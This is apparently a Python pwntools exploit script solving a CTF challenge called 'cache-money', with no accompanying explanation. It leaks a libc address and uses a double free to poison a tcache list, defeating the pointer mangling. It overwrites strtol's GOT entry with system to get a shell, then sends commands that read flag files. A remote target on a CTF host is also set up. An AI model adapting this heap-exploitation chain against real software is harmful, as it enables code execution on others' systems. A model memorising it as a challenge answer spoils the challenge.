#!/usr/bin/env python3
import sys, time
from pwn import *
context.log_level = 'error'
context.arch = 'amd64'

LIBC = ELF('./libc.so.6')
LD   = './ld-linux-x86-64-so.2'
BIN  = './cache-money'

LEAK_OFF   = 0x203b20
SYSTEM     = LIBC.symbols['system']
TARGET     = 0x4040C0
STRTOL_GOT = 0x404040

def start():
    return process([LD, '--library-path', '.', BIN])

def ru(p, m, t=15):
    return p.recvuntil(m, timeout=t)

def setup_batch():
    b = b''
    b += b'1\nD\n32\n'
    for i in range(8):
        b += b'1\nW\n256\n'
    b += b'1\nG\n256\n'
    for i in range(1, 8):
        b += b'5\n%d\n' % i
    b += b'4\n8\n0\n'
    b += b'3\n0\n'
    b += b'1\nA\n128\n'
    b += b'1\nB\n32\n'
    b += b'4\n1\n2\n'
    b += b'3\n2\n'
    b += b'2\n2\n'                      # start deposit(2)
    return b

def exploit(p):
    ru(p, b'>>> ')
    p.send(setup_batch())
    ru(p, b'Ledger contents for "D" (256 bytes):\n    ')
    leak1 = p.recvn(0x100, timeout=15)
    ru(p, b'Ledger contents for "B" (128 bytes):\n    ')
    leak2 = p.recvn(0x80, timeout=15)
    ru(p, b'Enter transaction data: ', t=15)

    libc_base = u64(leak1[0:8]) - LEAK_OFF
    system = libc_base + SYSTEM
    Xshift = u64(leak2[0:8])
    log.success('libc=%#x system=%#x Xshift=%#x' % (libc_base, system, Xshift))

    # deposit(2) payload : clear fd+key
    p.send(b'\x00' * 0x80)
    ru(p, b'>>> ', t=15)

    # open C, transfer 2->3 (double free), start deposit(3)
    p.send(b'1\nC\n32\n' + b'4\n2\n3\n' + b'2\n3\n')
    ru(p, b'Enter transaction data: ', t=15)

    # deposit(3) payload : poison fd
    poison = p64(TARGET ^ Xshift) + b'\x00' * (0x80 - 8)
    p.send(poison)
    ru(p, b'>>> ', t=15)

    # open P1, open P2 (P2.ledger == TARGET), start deposit(5)
    p.send(b'1\nP1\n128\n' + b'1\nP2\n128\n' + b'2\n5\n')
    ru(p, b'Enter transaction data: ', t=15)

    # deposit(5) payload : fake wallets table
    fake = bytearray(0x80)
    fake[0:8] = p64(TARGET + 0x40)
    off = 0x40
    fake[off:off+0x10] = b'/bin/sh\x00'.ljust(16, b'\x00')
    fake[off+0x10:off+0x18] = p64(0)
    fake[off+0x18:off+0x20] = p64(STRTOL_GOT)
    fake[off+0x20:off+0x28] = p64(8)
    fake[off+0x28:off+0x2c] = p32(1)
    p.send(bytes(fake))
    ru(p, b'>>> ', t=15)

    # start deposit(0)
    p.send(b'2\n0\n')
    ru(p, b'Enter transaction data: ', t=15)
    # deposit(0) payload : system -> strtol@got
    p.send(p64(system))
    ru(p, b'>>> ', t=15)

    # trigger: menu uses strtol -> system
    p.send(b'/bin/sh\n')
    time.sleep(0.5)
    p.sendline(b'echo PWNED_MARKER; id; cat /flag* /home/*/flag* /ctf/flag* 2>/dev/null; ls -la /')
    p.sendline(b'find / -maxdepth 3 -iname "flag*" 2>/dev/null; cat /flag 2>/dev/null')
    p.sendline(b'exit')
    time.sleep(1.0)
    return p.recvrepeat(6)

def main():
    mode = sys.argv[1] if len(sys.argv) > 1 else 'local'
    p = start() if mode == 'local' else remote('chal.sunshinectf.games', 26004)
    t0 = time.time()
    out = exploit(p)
    print(out.decode(errors='replace'))
    print("ELAPSED %.1f" % (time.time() - t0))
    try:
        p.interactive()
    except Exception:
        pass

if __name__ == '__main__':
    main()
